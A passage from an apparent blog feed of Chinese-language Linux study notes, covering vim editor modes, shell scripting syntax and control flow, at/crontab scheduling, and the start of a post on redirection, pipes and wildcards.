        <content type="html"><![CDATA[<h1 id="Linux学习-三"><a href="#Linux学习-三" class="headerlink" title="Linux学习(三)"></a>Linux学习(三)</h1><h2 id="vim编辑器与shell脚本"><a href="#vim编辑器与shell脚本" class="headerlink" title="vim编辑器与shell脚本"></a>vim编辑器与shell脚本</h2><h3 id="vim文本编辑器"><a href="#vim文本编辑器" class="headerlink" title="vim文本编辑器"></a>vim文本编辑器</h3><p>在linux系统中一切都是文件,而配置一个服务就是在修改其配置文件的参数 </p><p>vim编辑器中设置了三种模式 命令模式 末行模式 编辑模式,每种模式分别又支持多种不同的命令快捷键,这大大提高了工作效率.而且在用户习惯之后会感觉相当顺手.</p><ul><li>命令模式:控制光标移动,可以对文本进行复制 粘贴 删除和查找等工作</li><li>输入模式:正常的文本录入</li><li>末行模式:保存和退出文档,以及设置编辑环境</li></ul><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221858732.png" alt="image-20220322185811678"></p><p>每次运行vim编辑器时默认进入命令模式,此时需要切换到输入模式后再进行文档的编辑工作.而每次在编写完文档后需要先返回命令模式,然后再进入末行模式,执行文档的保存或者退出操作.在vim中,无法直接从输入模式切换到末行模式,vim编辑器中内置的命令有成百上千种用法</p><p>命令模式中最常用的一些命令</p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>dd</td><td>删除（剪切）光标所在整行</td></tr><tr><td>5dd</td><td>删除（剪切）从光标处开始的5行</td></tr><tr><td>yy</td><td>复制光标所在整行</td></tr><tr><td>5yy</td><td>复制从光标处开始的5行</td></tr><tr><td>n</td><td>显示搜索命令定位到的下一个字符串</td></tr><tr><td>N</td><td>显示搜索命令定位到的上一个字符串</td></tr><tr><td>u</td><td>撤销上一步的操作</td></tr><tr><td>p</td><td>将之前删除（dd）或复制（yy）过的数据粘贴到光标后面</td></tr></tbody></table><p>末行模式主要用于保存或退出文件,以及设置vim编辑器的工作环境,还可以让用户执行外部的linux命令或跳转到所编写文档的特定行数,像要切换到末行模式,在命令模式中输入一个冒号就可以了</p><p>末行模式中最常用的一些命令</p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>:w</td><td>保存</td></tr><tr><td>:q</td><td>退出</td></tr><tr><td>:q!</td><td>强制退出（放弃对文档的修改内容）</td></tr><tr><td>:wq!</td><td>强制保存退出</td></tr><tr><td>:set nu</td><td>显示行号</td></tr><tr><td>:set nonu</td><td>不显示行号</td></tr><tr><td>:命令</td><td>执行该命令</td></tr><tr><td>:整数</td><td>跳转到该行</td></tr><tr><td>:s&#x2F;one&#x2F;two</td><td>将当前光标所在行的第一个one替换成two</td></tr><tr><td>:s&#x2F;one&#x2F;two&#x2F;g</td><td>将当前光标所在行的所有one替换成two</td></tr><tr><td>:%s&#x2F;one&#x2F;two&#x2F;g</td><td>将全文中的所有one替换成two</td></tr><tr><td>?字符串</td><td>在文本中从下至上搜索该字符串</td></tr><tr><td>&#x2F;字符串</td><td>在文本中从上至下搜索该字符串</td></tr></tbody></table><h3 id="用vim编写简单文档"><a href="#用vim编写简单文档" class="headerlink" title="用vim编写简单文档"></a>用vim编写简单文档</h3><p>我的系统没有先下一个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install -y vim</span><br></pre></td></tr></table></figure><p>如果存在该文档,则是打开它,如果不存在,则是创建一个临时输入文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221923298.png" alt="image-20220322192350259"></p><p>打开之后默认进入的是vim编辑器的命令模式,此时只能执行该模式下的命令,而不能随意输入文本内容,我们需要切换到输入模式才可以编写该文档</p><p>可以分别使用 a i o 三个键从命令模式切换到输入模式,其中a键与i键分别是在光标后面一位和光标当前位置切换到输入模式,而o键则是在光标下面在创建一个空行,此时可以敲击a键进入到编辑器的输入模式</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221927790.png" alt="image-20220322192713731"></p><p>进入到输入模式后,可以随意输入文本内容,vim编辑器不会把您输入的文本内容当做命令而执行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221928554.png" alt="image-20220322192816517"></p><p>在编写完成之后,想要保存并退出,必须先敲击键盘上的esc键从输入模式返回命令模式,再输入”wq!”切换到末行模式才能完成保存并退出的操作</p><p>当在末行模式中输入”:wq!”命令时,就意味着强制保存并退出文档,然后就可以使用cat命令查看该文档的内容了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221931938.png" alt="image-20220322193137900"></p><p>继续编辑这个文件,因为要在原有文本内容下面追加内容,所以在命令模式中敲击o键进入模式更高效</p><h3 id="编写shell脚本"><a href="#编写shell脚本" class="headerlink" title="编写shell脚本"></a>编写shell脚本</h3><p>可以将shell终端解释器当成是人与计算机硬件之间的翻译官,它作为用户和系统内部的通讯媒介,除了能够使用支持各种变量与参数,还提供了诸如循环 分支等高级变成语言才有的控制结构特性.想要正确使用shell中的这些功能特性,准确下达命令尤为中要,shell脚本命令的工作方式有下面两种.</p><ul><li>交互式(interactive):用户每输入一条命令就立即执行</li><li>批处理(batch):由用户事先编写好的一个完整的shell脚本,shell会一次性执行脚本中诸多的命令</li></ul><p>在shell脚本中不仅会用到之前的linux命令以及正则表达式 管道符 数据流重定向等语法规则,还需要把内部功能模块化后通过逻辑语句进行处理,最终形成日常所见的shell脚本</p><p>通过查看shell变量可以发现,当前系统已经默认使用bash作为命令行终端解释器了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222013584.png" alt="image-20220322201356549"></p><h4 id="编写简单的脚本"><a href="#编写简单的脚本" class="headerlink" title="编写简单的脚本"></a>编写简单的脚本</h4><p>如果想查看当前所在工作路径并列出当前目录下所有的文件及属性信息,实现这个功能的脚本应该类似于下面这样</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222019409.png" alt="image-20220322201953373"></p><p>加上.sh后缀表示是一个脚本文件</p><p>在上面这个wanan.sh脚本中实际上出现了三种不同的元素:第一行的脚本声明(#!)用来告诉系统使用哪一种shell解释器来执行该脚本,第二行的注释信息(#)是对脚本功能和某些命令的介绍信息,使得自己或他人在日后看到这个脚本内容时,可以快速知道该脚本的作用或一些警告信息,第三 四行的可执行语句也就是我们平时执行的linux命令了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222024915.png" alt="image-20220322202427864"></p><h4 id="接收用户的参数"><a href="#接收用户的参数" class="headerlink" title="接收用户的参数"></a>接收用户的参数</h4><p>但是像上面的脚本程序只能执行一些预先定义好的功能,未免太过死板,为了让脚本程序能更好的满足用户的一些实时需求,以便灵活完成工作,必须要让脚本程序能够像之前执行命令时那样,接收用户输入的参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222027690.png" alt="image-20220322202722657"></p><p>这就意味着命令不仅需要能够接收用户输入的内容,还要有能力进行判断区别,根据不同的输入调用不同的功能</p><p>其实,linux系统中的shell脚本语言早就考虑到了这些,已经内设了用于接收参数的变量,变量之间使用空格间隔,例如,$0对应的是当前shell脚本程序的名称,$#对应的是总共有几个参数,$*对应的是所有位置的参数值,$?对应的是显示上一次命令的执行返回值,而$1 $2 $3…则分别对应着第n个位置的参数值</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222031316.png" alt="image-20220322203152198"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222034555.png" alt="image-20220322203407520"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222034464.png" alt="image-20220322203438427"></p><h4 id="判断用户的参数"><a href="#判断用户的参数" class="headerlink" title="判断用户的参数"></a>判断用户的参数</h4><p>系统在执行mkdir命令时会判断用户输入的信息,即判断用户指定的文件夹名称是否已经存在,如果存在则提示错误,反之则自动创建.shell脚本中的条件测试语法可以判断表达式是否成立,若条件成立则返回数字0,否则便返回非零值.条件测试语法 执行格式如下,条件表达式两边均应有一个空格</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222038802.png" alt="image-20220322203843765"></p><p>按照测试对象来划分,条件测试语句可以分为4种</p><ul><li>文件测试语句</li><li>逻辑测试语句</li><li>整数值比较语句</li><li>字符串比较语句</li></ul><p>文件测试即使用指定条件来判断文件是否存在或权限是否满足等情况的运算符</p><p>文件测试所用的参数</p><table><thead><tr><th>操作符</th><th>作用</th></tr></thead><tbody><tr><td>-d</td><td>测试文件是否为目录类型</td></tr><tr><td>-e</td><td>测试文件是否存在</td></tr><tr><td>-f</td><td>判断是否为一般文件</td></tr><tr><td>-r</td><td>测试当前用户是否有权限读取</td></tr><tr><td>-w</td><td>测试当前用户是否有权限写入</td></tr><tr><td>-x</td><td>测试当前用户是否有权限执行</td></tr></tbody></table><p>下面使用文件测试语句来判断&#x2F;etc&#x2F;fstab是否为一个目录行文件,然后通过shell解释器的内置$?变量显示上一条命令执行后的返回值.如果返回值是0则目录存在,如果返回值是非零的值,则意味着它不是目录,或者不存在这个目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222043006.png" alt="image-20220322204328968"></p><p>在使用文件测试语句来判断&#x2F;etc&#x2F;fstab是否为一般文件,如果返回值为0,代表文件存在,且为一般文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222044557.png" alt="image-20220322204454524"></p><p>判断和查询一定要敲两次吗</p><p>逻辑语句用于对测试结果进行逻辑分析,根据测试结果可以实现不同的效果,例如在shell终端中逻辑”与”的运算符号是&amp;&amp; 他表示前面的命令执行成功后才会执行它后面的命令,因此可以用来判断&#x2F;dev&#x2F;cdrom文件是否存在,若存在则输出exist字样</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222048693.png" alt="image-20220322204830660"></p><p>除了逻辑与外还有逻辑或,他在linux系统中的运算符为|| 代表当前命令执行失败后才会执行它后面的命令,因此可以用来结合系统环境变量USER来判断当前用户是否非管理员身份</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222053819.png" alt="image-20220322205326783"></p><p>第三种逻辑语句是非,在linux系统中的运算符号是一个叹号(!) 它表示把条件测试中的判断结果取相反值,也就是说,如果原本测试结果是正确的,则将其变成错误的,原本测试错误的结果,则将其变成正确的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222056411.png" alt="image-20220322205600378"></p><p>叹号应该放在判断语句的前面,代表对整个的测试语句进行取反值的操作,而不应该写成”$USER !&#x3D; root 因为 !&#x3D; 代表的是不等于符号≠,尽管执行效果一样,但缺少了逻辑关系</p><ul><li>&amp;&amp;是逻辑与,只有当前面的语句执行成功的时候才会执行后面的语句</li><li>||是逻辑或,只有当前面的语句执行失败的时候才会执行后面的语句</li><li>!是逻辑非,代表对逻辑测试结果取反值,之前若为正确则变成错误,若为错误则变成正确</li></ul><p>整数比较运算符仅是对数字的操作,不能将数字与字符串 文件等内容一起操作,而且不能像当然的使用日常生活中的等号 大于号 小于号来进行判断,因为等号与复制命令符冲突,大于号和小于号分别与输出重定向命令符合输入重定向命令符冲突,因此一定要使用规范的整数比较运算符来进行操作</p><p> 可用的整数比较运算符</p><table><thead><tr><th>操作符</th><th>作用</th></tr></thead><tbody><tr><td>-eq</td><td>是否等于</td></tr><tr><td>-ne</td><td>是否不等于</td></tr><tr><td>-gt</td><td>是否大于</td></tr><tr><td>-lt</td><td>是否小于</td></tr><tr><td>-le</td><td>是否等于或小于</td></tr><tr><td>-ge</td><td>是否大于或等于</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222106004.png"></p><p>free命令可以用来获取当前系统正在使用及可以使用的内存量信息,先使用free -m命令查看内存使用量情况 ,然后通过 grep men 命令过出剩余内存量的行,在用awk ‘{print $4}’命令值保留第四列</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222112003.png" alt="image-20220322211215956"></p><p>如果想把这个命令写入到shell脚本中,那么建议把输出结果赋值给一个变量,以方便其他命令进行调用</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222114385.png" alt="image-20220322211425345"></p><p>上面用于获取内存可用量的命令,接下来我们使用整数运算符来判断内存可用量的值是否小于1024,若小于则会提示 lnsufficient Memory (内存不足) 的字样</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222117919.png" alt="image-20220322211734881"></p><p>字符串比较语句用来判断测试字符串是否为空值,或者两个字符串是否相同, 它通常用来判断某个变量是否被定义(即内容为空值)</p><p>  常见的字符串比较运算符</p><table><thead><tr><th>操作符</th><th>作用</th></tr></thead><tbody><tr><td>&#x3D;</td><td>比较字符串内容是否相同</td></tr><tr><td>!&#x3D;</td><td>比较字符串内容是否不同</td></tr><tr><td>-z</td><td>判断字符串内容是否为空</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222119391.png" alt="image-20220322211927354"></p><p>当用于保存当前语系的环境变量值LANG不是英语时,则会满足逻辑测试条件并输出</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222121853.png" alt="image-20220322212138817"></p><h3 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h3><h4 id="if条件测试语句"><a href="#if条件测试语句" class="headerlink" title="if条件测试语句"></a>if条件测试语句</h4><p>if条件测试语句可以让脚本根据实际情况自动执行相应的命令,if条件测试语句的单分支结构由if then fi关键词组成,而且只在条件成立后才执行预设的命令</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222124581.png" alt="image-20220322212455541"></p><p>下面使用单分支的if条件语句俩判断&#x2F;media&#x2F;cdrom目录是否存在,若不存在就创建这个目录,反之则结束条件判断和整个shell脚本的执行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222127157.png" alt="image-20220322212746118"></p><p>这里使用bash脚本名称的方式来执行脚本,在正常情况下顺利执行完脚本文件没有任何输出信息,但是可以使用ls命令验证&#x2F;media&#x2F;cdrom目录是否创建成功</p><p>下面使用双分支的if语句来验证某台主机是否在线,然后根据返回值的结果,要么显示主机在线,要么显示主句不在线信息.这里的脚本主要使用ping命令来测试与对方主机的网络连通性,而linux系统中的ping命令栏不像windows一样尝试四次就结束,因此为了避免用户等待时间过长,需要通过-c参数来规定尝试的次数,并使用-i参数定义每个数据包的发送间隔,以及使用-W参数定义等待超过时间</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231117579.png" alt="image-20220323111708471"></p><p>$? 的作用是显示上一次命令的执行返回值.若前面那条语句执行成功,则$?变量会显示数字0 反之则显示一个非零的数字.一次可以用整数比较运算符来判断$?变量是否为0 从而获知那条语句的最终判断情况</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231247737.png" alt="image-20220323124721697"></p><p>if条件语句的多分支结构由if then else fi 关键词组成,它进行多次条件判断,这多次判断中的任何一项在匹配成功后都会执行相应预设的命令,相当于口语的如果 那么 如果那么.</p><p>在linux系统中,read是用来读取用户输入信息的命令,能够把接受到的用户输入信息赋给后面的指定变量,-p参数用于向用户显示一些提示信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231249225.png" alt="image-20220323124926187"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231253070.png" alt="image-20220323125337033"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231254628.png" alt="image-20220323125428594"></p><h4 id="for条件循环语句"><a href="#for条件循环语句" class="headerlink" title="for条件循环语句"></a>for条件循环语句</h4><p>for循环语句允许脚本一次性读取多个信息,然后逐一对信息进行操作处理,当要处理的数据有范围时,使用for循环语句就在合适不过</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231256993.png" alt="image-20220323125622957"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231256714.png" alt="image-20220323125643672"></p><p>&#x2F;dev&#x2F;null是一个被称为linux黑洞的文件,把输入信息重定向到这个文件等同于删除数据,类似于没有回收功能的垃圾箱,可以让用户的屏幕保持整洁</p><p>执行批量创建用户的Shell脚本addusers.sh，在输入为账户设定的密码后将由脚本自动检查并创建这些账户。由于已经将多余的信息通过输出重定向符转移到了&#x2F;dev&#x2F;null黑洞文件中，因此在正常情况下屏幕窗口除了“用户账户创建成功”（Create success）的提示后不会有其他内容。</p><p>在Linux系统中，&#x2F;etc&#x2F;passwd是用来保存用户账户信息的文件。如果想确认这个脚本是否成功创建了用户账户，可以打开这个文件，看其中是否有这些新创建的用户信息。</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231259528.png" alt="image-20220323125901488"></p><h4 id="while条件循环语句"><a href="#while条件循环语句" class="headerlink" title="while条件循环语句"></a>while条件循环语句</h4><p>while条件循环语句是一种让脚本根据某些条件来重复执行命令的语句,他的循环结果往往在执行前不确定最终执行的次数,完全不同于for循环中有目标有范围的使用场景.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231301163.png" alt="image-20220323130101126"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231302880.png" alt="image-20220323130237839"></p><h4 id="case条件测试语句"><a href="#case条件测试语句" class="headerlink" title="case条件测试语句"></a>case条件测试语句</h4><p>case条件测试语句和switch语句的功能非常相似！case语句是在多个范围内匹配数据，若匹配成功则执行相关命令并结束整个条件测试；如果数据不在所列出的范围内，则会去执行星号（*）中所定义的默认命令。</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231302033.png" alt="image-20220323130227986"></p><h3 id="计划任务服务程序"><a href="#计划任务服务程序" class="headerlink" title="计划任务服务程序"></a>计划任务服务程序</h3><p>计划任务分为一次性计划任务与长期性计划任务</p><ul><li>一次性计划任务:今晚23:30重启网站服务</li><li>长期性计划任务:每周一的凌晨3:25把&#x2F;home&#x2F;wwwroot目录打包备份到backup.tar.gz</li></ul><p>顾名思义,一次性计划任务只执行一次,一般用于临时的工作需求.可以使用at命令实现这种功能,只需要写成 at 时间 的形式就行.如果想要查看已经设置好的但未执行的一次性计划任务,可以使用at -l 命令;要想将其删除,可以使用 “atrm任务序号” </p><p> at命令的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-f</td><td>指定包含命令的任务文件</td></tr><tr><td>-q</td><td>指定新任务名称</td></tr><tr><td>-l</td><td>显示待执行任务列表</td></tr><tr><td>-d</td><td>删除指定待执行任务</td></tr><tr><td>-m</td><td>任务执行后给用户发邮件</td></tr></tbody></table><p>在使用at命令来设置一次性计划任务时默认采用的是交互式方法.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231309945.png" alt="image-20220323130900907"></p><p>在输入完成systemctl restart httpd之后按下ctrl 加上 d来结束编写计划任务</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231310030.png" alt="image-20220323131012997"></p><p>也可以使用管道符达到非交互式的方式创建计划一次性任务的目的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231335365.png" alt="image-20220323133521329"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231341301.png" alt="image-20220323134108264"></p><p>可以使用atrm命令轻松删除其中一条</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231341729.png" alt="image-20220323134152695"></p><p>这里还有一种特殊场景把一计划任务写入到shell脚本中,当用户激活该脚本后再开始倒计时执行,而不是像上面那样在固定的时间进行</p><p>一般会使用at now +2 MINUTE 的方式进行操作,这表示2分钟(MINUTE)后执行这个任务,也可以将其代替为小时(HOUR) 日(DAY) 月(MONTH)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231343800.png" alt="image-20220323134306764"></p><p>还有些时候,我们希望linux系统能都周期性的有规律的执行某些具体的任务,那么linux系统中默认弃用crond服务简直在合适不过.创建编辑计划任务的命令时crontab -e,查看当前计划任务的命令为crontab -l,删除某条计划任务的命令为crontab -r.另外如果是管理员身份登录,可以在crontab命令中加上-u 参数来编辑他人的计划任务.</p><p>crontab命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-e</td><td>编辑计划任务</td></tr><tr><td>-u</td><td>指定用户名称</td></tr><tr><td>-l</td><td>列出任务列表</td></tr><tr><td>-r</td><td>删除计划任务</td></tr></tbody></table><p>分 时 日 月 星期 命令,这是使用crond服务设置任务的参数格式,如果有些字段没有被设置,则需要使用星号(*)占位</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231348532.png" alt="image-20220323134842478"></p><p>  使用crond设置任务的参数字段说明</p><table><thead><tr><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>分钟</td><td>取值为0～59的整数</td></tr><tr><td>小时</td><td>取值为0～23的任意整数</td></tr><tr><td>日期</td><td>取值为1～31的任意整数</td></tr><tr><td>月份</td><td>取值为1～12的任意整数</td></tr><tr><td>星期</td><td>取值为0～7的任意整数，其中0与7均为星期日</td></tr><tr><td>命令</td><td>要执行的命令或程序脚本</td></tr></tbody></table><p>假设在每周一 三 五的凌晨3:25,都需要使用tar命令把某个网站的数据目录进行打包处理,使其作为一个备份文件.我们可以使用crontab -e命令来创建计划任务,为自己创建计划任务时无需使用-u参数.crontab -e命令的具体实现效果和crontab -l命令的结果</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231352690.png" alt="image-20220323135225649"></p><p>除了使用逗号(,)来分别表示多个时间段,例如”8,9,12”表示8月,9月,12月.还可以使用减号(-)来表示一段连续的时间周期,(例如字段”日”的取值为”12-15”,则表示每月的12-15日).还可以用除号(&#x2F;)表示执行任务的间隔时间(例如”*&#x2F;2”表示没间隔两分钟执行一次任务)</p><p>如果在crond服务中需要同时包含多条计划任务的命令语句,应该每行仅写一条.例如我们在添加一条计划任务,它的功能是每周一至周五的凌晨一点自动清空&#x2F;tmp目录中的所有文件.尤其需要注意的是,在crond服务的计划任务参数中,所有命令一定要用绝对路径的方式来写,如果不知道绝对路径,请用whereis命令来进行查询.rm命令的路径为下面输出信息中的加粗部分</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231359170.png" alt="image-20220323135959125"></p><ul><li>在crond服务的配置参数中,一般会像shell脚本那样以#号开头写上注释信息,这样在日后回顾这段命令代码时可以快速了解其功能需求以及编写人员等重要信息.</li><li>计划任务中的”分”字段必须有数值,绝对不能为空或者是(*)号,而”日”和”星期”字段不能同时使用,否则就会发生冲突</li></ul><p>删除crond计划任务使用crondtab -e命令进入编辑界面,删除里面的文本信息即可.也可以使用crondtab -r命令直接进行删除</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231404545.png" alt="image-20220323140419505"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习(二)</title>
      <link href="/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/"/>
      <url>/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux学习-二"><a href="#Linux学习-二" class="headerlink" title="Linux学习(二)"></a>Linux学习(二)</h1><h2 id="管道符-重定向与环境变量"><a href="#管道符-重定向与环境变量" class="headerlink" title="管道符 重定向与环境变量"></a>管道符 重定向与环境变量</h2><h3 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h3><ul><li>标准输入重定向(STDIN,文件描述符为0):默认从键盘输入,也可以从其他文件或命令中输入</li><li>标准输出重定向(STDOUT,文件描述符为1):默认输出到屏幕</li><li>错误输出重定向(STDERR,文件描述符为2):默认输出到屏幕</li></ul><p>比如分别查看两个文件的属性信息,我们先创建第一个文件,而第二个文件是不存在的.所以针对这两个文件的操作都分别会在屏幕上输出一些信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211512809.png" alt="image-20220321151203749"></p><p>上述命令中,名为1的文件是真实存在的,输出信息是该文件的相关权限 所有者 文件大小 及修改时间等信息 这也是该命令的标准输出信息 而名为xxxx 的文件本来是不存在的,因此在执行完该ls 命令之后显示的报错信息也是该命令的错误输出信息.那么想要把原本输出到屏幕上的数据转而写入文件中,就需要区别对待这两种输出信息</p><p> 输入重定向中用到的符号及其作用</p><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>命令 &lt; 文件</td><td>将文件作为命令的标准输入</td></tr><tr><td>命令 &lt;&lt; 分界符</td><td>从标准输入中读入，直到遇见分界符才停止</td></tr><tr><td>命令 &lt; 文件1 &gt; 文件2</td><td>将文件1作为命令的标准输入并将标准输出到文件2</td></tr></tbody></table><p> 输出重定向中用到的符号及其作用</p><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>命令 &gt; 文件</td><td>将标准输出重定向到一个文件中（清空原有文件的数据）</td></tr><tr><td>命令 2&gt; 文件</td><td>将错误输出重定向到一个文件中（清空原有文件的数据）</td></tr><tr><td>命令 &gt;&gt; 文件</td><td>将标准输出重定向到一个文件中（追加到原有内容的后面）</td></tr><tr><td>命令 2&gt;&gt; 文件</td><td>将错误输出重定向到一个文件中（追加到原有内容的后面）</td></tr><tr><td>命令 &gt;&gt; 文件 2&gt;&amp;1   或  命令 &amp;&gt;&gt; 文件</td><td>将标准输出与错误输出共同写入到文件中（追加到原有内容的后面）</td></tr></tbody></table><p>对于重定向中的标准输出模式,可以省略文件描述符1 不写,而错误输出模式的文件描述2是必须要写的 .通过标准输出重定向将 man bash命令原本要输出到屏幕的信息写入到文件readme.txt中,然后显示该文件中的内容</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211519188.png" alt="image-20220321151943105"></p><p>接下来将使用覆盖写入与追加写入这两种不同的模式带来的变化 首先通过覆盖写入模式像readme.txt文件写入多行数据,这个命令只会剩下最后一次的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241309078.png" alt="image-20220321152327141"></p><p>使用追加的方式向readme.txt文件写入一次数据,然后执行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211645801.png" alt="image-20220321164528752"></p><p>虽然都是重定向,但是命令的标准输出和错误输出还是有区别的.</p><p>将错误的信息输出到文件中去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211650806.png" alt="image-20220321165050759"></p><p>还有就是不区分标准输出和错误输出,只要命令有输出信息就追加写入到文件中.这就要用到&amp;&gt;&gt;操作符了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211658770.png" alt="image-20220321165844731"></p><p>输出重定向的作用就是把文件直接导入到命令中 接下来使用输出重定向把readme.txt文件导入给wc -l命令,统计一下文件中的内容行数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211700527.png" alt="image-20220321170039490"></p><h3 id="管道命令符"><a href="#管道命令符" class="headerlink" title="管道命令符"></a>管道命令符</h3><p>管道命令符的作用也可以概括为一句话 把前一个命令原本要输出到屏幕的信息当做后一个命令的标准输入,我们通过匹配关键字&#x2F;sbin.nologin找出了所有被限制登录系统的用户</p><ul><li>找出被限制登录的名称是grep &#x2F;sbin&#x2F;nologin &#x2F;etc&#x2F;passwd</li><li>统计文本函数的命令时wc -l</li></ul><p>现在需要做的是把grep搜索命令的输出值传递给wc统计命令,即把原本要输出到屏幕的用户信息列表在交给wc命令做进一步的加工,因此只需要把管道符放到两条语句之间即可</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211706811.png" alt="image-20220321170638770"></p><p>比如用翻页的模式查看&#x2F;etc目录中的文件列表及属性信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211708008.png" alt="image-20220321170817968"></p><p>在修改用户密码时,通常需要输入两次密码以进行确认,这在编写自动化脚本的时候将成为一个非常致命的缺陷,通常把管道符和passwd命令的–stdin参数相结合,可以使用一条命令来完成密码重置操作</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211710988.png" alt="image-20220321171033943"></p><p>在输入ps aux命令后屏幕上的信息呼呼闪过,看不到有用信息,现在可以将ps grep 管道符 三者结合到一起使用了 下面搜索与bash 有关的进程信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211712433.png" alt="image-20220321171257391"></p><p>如果需要将管道符处理后的结果既要输出到屏幕,又同时写入到文件中,则可以与tee命令相结合使用</p><p>下面的命令将显示系统中所有与bash相关的进程信息,并同时将输出到屏幕和文件中</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211715506.png" alt="image-20220321171555470"></p><h3 id="命令行的统配符"><a href="#命令行的统配符" class="headerlink" title="命令行的统配符"></a>命令行的统配符</h3><p>比如,我们想要批量查看所有硬盘文件的相关权限属性.这些硬盘设备文件都是以sda开头并且存放到了&#x2F;dev目录中，这样一来，即使不知道硬盘的分区编号和具体分区的个数，也可以使用通配符来搞定</p><p>通配符就是通用的匹配信息的符号,比如星号*代表匹配零个或者多个符号,问号?表示匹配单个字符,中括号内加上数字[0-9]表示匹配0-9之间的单个数字的字符,而中括号内加上字母[abc]则是表示匹配abc三个字符中的任意一个字符</p><p> 